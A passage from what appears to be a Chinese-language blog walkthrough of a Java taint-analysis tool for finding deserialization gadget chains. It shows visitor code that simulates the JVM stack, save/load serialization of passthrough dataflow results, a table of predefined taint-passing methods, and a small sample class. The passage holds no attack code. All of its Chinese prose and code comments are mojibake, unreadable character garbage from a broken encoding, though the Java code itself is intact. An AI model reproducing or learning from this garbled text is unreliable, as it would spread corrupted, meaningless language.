è®°å½•æ•°æ®èµ·å§‹ä½ç½®</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="type">Type</span> <span class="variable">argType</span> <span class="operator">=</span> argTypes[i];</span><br><span class="line">                <span class="keyword">if</span> (argType.getSize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// æ ¹æ®å‚æ•°ç±»å‹çš„å¤§å°ï¼Œè°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint è¯»å–æ ˆä¸­çš„å€¼</span></span><br><span class="line">                    <span class="comment">// å‚æ•°ä»å³å¾€å·¦å…¥æ ˆï¼Œè¿™é‡Œå°†å‚æ•°å€¼æ‹·è´åˆ° argTaint</span></span><br><span class="line">                    argTaint.set(argTypes.length - <span class="number">1</span> - i, getStackTaint(stackIndex + argType.getSize() - <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                stackIndex += argType.getSize();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœè¢«è°ƒç”¨çš„æ˜¯æ„é€ æ–¹æ³•ï¼Œåˆ™è®¤ä¸ºè¢«è°ƒç”¨æ–¹æ³•æ‰€å±ç±»çš„å®ä¾‹å¯¹è±¡æœ¬èº«å¯ä»¥ä¼ é€’æ±¡æŸ“</span></span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// Pass result taint through to original taint set; the initialized object is directly tainted by</span></span><br><span class="line">                <span class="comment">// parameters</span></span><br><span class="line">                resultTaint = argTaint.get(<span class="number">0</span>);  <span class="comment">// ä»æ ˆé¡¶å–å‡ºå¯¹è±¡ï¼Œå®é™…ä¸Šæ˜¯è¯¥å¯¹è±¡çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resultTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();  <span class="comment">// å¦åˆ™åˆå§‹åŒ–ä¸ºç©º</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ç»è¿‡é€†æ‹“æ‰‘æ’åºï¼Œè°ƒç”¨é“¾æœ«ç«¯çš„æ–¹æ³•å…ˆè¢«è®¿é—®å’Œåˆ¤æ–­ï¼Œå³è¢«è°ƒç”¨æ–¹æ³•å·²ç»è¢«åˆ¤æ–­è¿‡</span></span><br><span class="line">            <span class="comment">// ä¾‹å¦‚ A-&gt;Bï¼Œåˆ¤æ–­ A æ—¶ B å·²ç»æœ‰åˆ¤æ–­ç»“æœäº†ï¼Œå¹¶ä¸”æ­¤æ—¶æ ˆä¸­çš„æ•°æ®æ˜¯è¿™æ ·ï¼šBå¯¹è±¡ Bå‚æ•°</span></span><br><span class="line">            Set&lt;Integer&gt; passthrough = passthroughDataflow.get(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">            <span class="comment">// å¦‚æœè¢«è°ƒç”¨æ–¹æ³•å­˜åœ¨èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°</span></span><br><span class="line">            <span class="keyword">if</span> (passthrough != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// éå†å‚æ•°ç´¢å¼•</span></span><br><span class="line">                <span class="keyword">for</span> (Integer passthroughDataflowArg : passthrough) &#123;</span><br><span class="line">                    <span class="comment">// ä»æ ˆä¸­è·å–èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆï¼Œå…¨éƒ¨æ·»åŠ åˆ° resultTaint</span></span><br><span class="line">                    resultTaint.addAll(argTaint.get(passthroughDataflowArg));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitMethodInsn æ‰§è¡Œå‡º/å…¥æ ˆæ“ä½œï¼Œæ ¹æ®é¢„å®šä¹‰çš„åˆ¤æ–­è§„åˆ™åˆ†æå‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">    <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›å€¼ä¸ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// å®ä¾‹å¯¹è±¡æœ¬èº«æœ‰å¯èƒ½ä¼ é€’æ±¡æŸ“ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æ ¹æ®è¿”å›å€¼åˆ¤æ–­ï¼ˆå³ä¸èƒ½æœ€å…ˆæ‰§è¡Œè¿™ä¸€å—ï¼‰</span></span><br><span class="line">    <span class="keyword">if</span> (retSize &gt; <span class="number">0</span>) &#123;  <span class="comment">// 1 æˆ–è€… 2</span></span><br><span class="line">        <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.getStackTaint å°† resultTaint ä¸­çš„å…ƒç´ åˆå¹¶åˆ°å‚æ•°ç´¢å¼•é›†åˆä¸­</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œå‡ 1 æ˜¯å› ä¸ºåœ¨ TaintTrackingMethodVisitor.visitMethodInsn ä¸­å·²ç»å°†ç¬¬ä¸€ä¸ªå•ä½çš„å€¼è®¾ç½®ä¸ºå…¶åˆ†æå¾—åˆ°çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">        getStackTaint(retSize - <span class="number">1</span>).addAll(resultTaint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> æ–¹æ³•å’Œ <code>load</code> æ–¹æ³•ä½¿ç”¨å·¥å‚æ–¹æ³•å®ç°æ•°æ®çš„å­˜å–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨å­˜å‚¨æ•°æ®æµä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (passthroughDataflow == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Save called before discover()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">PassThroughFactory</span>(), passthroughDataflow.entrySet());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» passthrough.dat åŠ è½½æ•°æ®æµä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; load() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry : DataLoader.loadData(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">PassThroughFactory</span>())) &#123;</span><br><span class="line">        passthroughDataflow.put(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ•°æ®å·¥å‚æ¥å£å®ç°</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PassThroughFactory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt;&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; parse(String[] fields) &#123;</span><br><span class="line">        ClassReference.<span class="type">Handle</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]);</span><br><span class="line">        MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(clazz, fields[<span class="number">1</span>], fields[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">        Set&lt;Integer&gt; passthroughArgs = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String arg : fields[<span class="number">3</span>].split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arg.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                passthroughArgs.add(Integer.parseInt(arg));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry&lt;&gt;(method, passthroughArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Map.Entry&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; entry) &#123;</span><br><span class="line">        <span class="keyword">if</span> (entry.getValue().size() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String[] fields = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];</span><br><span class="line">        fields[<span class="number">0</span>] = entry.getKey().getClassReference().getName();   <span class="comment">// æ–¹æ³•æ‰€å±ç±»çš„ç±»å</span></span><br><span class="line">        fields[<span class="number">1</span>] = entry.getKey().getName();   <span class="comment">// æ–¹æ³•çš„åç§°</span></span><br><span class="line">        fields[<span class="number">2</span>] = entry.getKey().getDesc();   <span class="comment">// æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (Integer arg : entry.getValue()) &#123;</span><br><span class="line">            sb.append(Integer.toString(arg));</span><br><span class="line">            sb.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fields[<span class="number">3</span>] = sb.toString();  <span class="comment">// å‚æ•°ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> fields;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-TaintTrackingMethodVisitor"><a href="#6-TaintTrackingMethodVisitor" class="headerlink" title="6. TaintTrackingMethodVisitor"></a>6. TaintTrackingMethodVisitor</h2><p>ç»§æ‰¿ asm çš„ MethodVisitorï¼Œæ¨¡æ‹Ÿ JVM å†…å­˜ç»“æ„ï¼Œå³æœ¬åœ°å˜é‡è¡¨ <code>localVars</code> å’Œæ“ä½œæ•°æ ˆ <code>stackVars</code>ï¼›é‡å†™äº†å¤§é‡æ–¹æ³•æ¨¡æ‹Ÿè°ƒç”¨å‚æ•°æ—¶çš„å‡º&#x2F;å…¥æ ˆæ“ä½œï¼Œç”¨äºè¿›è¡Œæ±¡ç‚¹åˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SavedVariableState</span>&lt;T&gt; &#123;</span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; localVars; <span class="comment">// æœ¬åœ°å˜é‡è¡¨</span></span><br><span class="line">    List&lt;Set&lt;T&gt;&gt; stackVars; <span class="comment">// æ“ä½œæ•°æ ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SavedVariableState</span><span class="params">()</span> &#123;</span><br><span class="line">        localVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        stackVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SavedVariableState</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.localVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(copy.localVars.size());</span><br><span class="line">        <span class="built_in">this</span>.stackVars = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(copy.stackVars.size());</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.localVars) &#123;</span><br><span class="line">            <span class="built_in">this</span>.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Set&lt;T&gt; original : copy.stackVars) &#123;</span><br><span class="line">            <span class="built_in">this</span>.stackVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(original));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">combine</span><span class="params">(SavedVariableState&lt;T&gt; copy)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; copy.localVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="built_in">this</span>.localVars.size()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.localVars.get(i).addAll(copy.localVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; copy.stackVars.size(); i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &gt;= <span class="built_in">this</span>.stackVars.size()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.stackVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.stackVars.get(i).addAll(copy.stackVars.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢„å®šä¹‰äº†ä¸€äº›æ•°æ®æµä¿¡æ¯ï¼šç±»åï¼Œæ–¹æ³•åï¼Œæ–¹æ³•æè¿°ç¬¦ï¼Œä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Object[][] PASSTHROUGH_DATAFLOW = <span class="keyword">new</span> <span class="title class_">Object</span>[][]&#123;</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Taint from ObjectInputStream. Note that defaultReadObject() is handled differently below</span></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readObject&quot;</span>, <span class="string">&quot;()Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;readFields&quot;</span>, <span class="string">&quot;()Ljava/io/ObjectInputStream$GetField;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream$GetField&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class name to returned class</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Object&quot;</span>, <span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;()Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/Class;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass taint from class or method name to returned method</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethod&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        <span class="comment">// Pass taint from class to methods</span></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/Class&quot;</span>, <span class="string">&quot;getMethods&quot;</span>, <span class="string">&quot;()[Ljava/lang/reflect/Method;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)V&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/StringBuffer;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;append&quot;</span>, <span class="string">&quot;(Ljava/lang/CharSequence;II)Ljava/lang/StringBuilder;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/lang/StringBuilder&quot;</span>, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([B)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ByteArrayInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;([BII)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/ObjectInputStream&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/io/InputStream;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;I)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/io/File;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;java/io/File&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/nio/paths/Paths&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;&quot;</span>, <span class="number">0</span>&#125;,</span><br><span class="line"></span><br><span class="line">        &#123;<span class="string">&quot;java/net/URL&quot;</span>, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="number">1</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼šè¿™é‡Œå®ç°çš„ <code>visitMethodInsn</code> æ¯” PassthroughDataflowMethodVisitor.visitMethodInsn å¤šä¸‰ä¸ªåˆ¤æ–­è§„åˆ™ï¼Œåé¢ CallGraphDiscovery ä¸­çš„ ModelGeneratorMethodVisitor ä¹Ÿé‡å†™äº†è¯¥æ–¹æ³•å¹¶åœ¨æœ€åè°ƒç”¨è¯¥çˆ¶ç±»æ–¹æ³•ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥å‰¥ç¦»å‡ºæ¥ï¼Ÿ</p><ul><li>PassthroughDataflowMethodVisitor ä¸­å­˜å‚¨çš„æ˜¯å‚æ•°ç´¢å¼•ï¼Œè€Œ ModelGeneratorMethodVisitor ä¸­å­˜å‚¨çš„æ˜¯ <code>argå‚æ•°ç´¢å¼•.å­—æ®µåç§°</code></li><li>å‡ºå…¥æ ˆæ“ä½œéƒ½åœ¨ TaintTrackingMethodVisitor ä¸­å®ç°</li><li>ç»è¿‡è¯¥æ–¹æ³•çš„æ¨¡æ‹Ÿï¼Œæ ˆé¡¶å…ƒç´ å³è¯¥æ–¹æ³•èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</li></ul><p>ä¸¾ä¸ªä¾‹å­çœ‹ä¸€çœ‹å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>().method1(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getValue</span><span class="params">(Integer number)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;100&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(s);</span><br><span class="line"></span><br><span class="line">        n = number;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> n.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">method1</span><span class="params">(String param)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getValue</code> éƒ¨åˆ†çš„å­—èŠ‚ç 